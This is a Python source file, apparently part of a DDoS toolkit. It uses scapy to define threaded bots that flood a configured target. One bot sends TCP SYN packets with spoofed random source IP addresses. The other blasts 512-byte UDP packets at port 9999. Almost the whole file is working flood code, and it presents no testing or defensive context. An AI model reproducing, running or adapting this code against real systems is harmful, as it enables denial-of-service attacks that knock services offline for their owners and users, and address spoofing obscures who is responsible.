import time, threading, socket
from scapy.layers.inet import IP, TCP, UDP
from scapy.sendrecv import send
from scapy.volatile import RandIP, RandShort
from scapy.all import *
from pathlib import Path
from utils.utils import load_json

ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/l4ddos.json")
TARGET_IP = ddos_config["l4"]["TARGET_IP"]
TARGET_PORT = ddos_config["l4"]["TARGET_PORT"]


class L4SYNBot(threading.Thread):
    def __init__(self, stop_time: int, num: int, pps: int | None):
        super().__init__()
        self.target_ip = TARGET_IP
        self.target_port = TARGET_PORT
        self.stop_time = stop_time
        self.pps = pps
        self.name = f"bot{num}"
        self.local_packets_sent = 0
        self.local_errors_count = 0

    def run(self):
        conf.verb = 0

        while time.time() < self.stop_time:
            try:
                packet = IP(dst=self.target_ip, src=RandIP()) / \
                         TCP(dport=self.target_port,
                             sport=RandShort(),
                             flags="S")

                send(packet, count=1)

                self.local_packets_sent += 1

                if self.pps:
                    time.sleep(1.0/self.pps)

            except Exception as e:
                self.local_errors_count += 1


class L4UDPBot(threading.Thread):
    def __init__(self, stop_time: int, num: int, pps: int | None):
        super().__init__()
        self.target_ip = TARGET_IP
        self.stop_time = stop_time
        self.pps = pps
        self.name = f"bot{num}"
        self.local_packets_sent = 0
        self.local_errors_count = 0
        self.local_bytes_sent = 0

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)

        payload = b'X' * 512

        while time.time() < self.stop_time:
            try:
                sock.sendto(payload, (self.target_ip, 9999))

                self.local_packets_sent += 1
                self.local_bytes_sent += len(payload)

                if self.pps:
                    time.sleep(1.0/self.pps)

            except Exception:
                self.local_errors_count += 1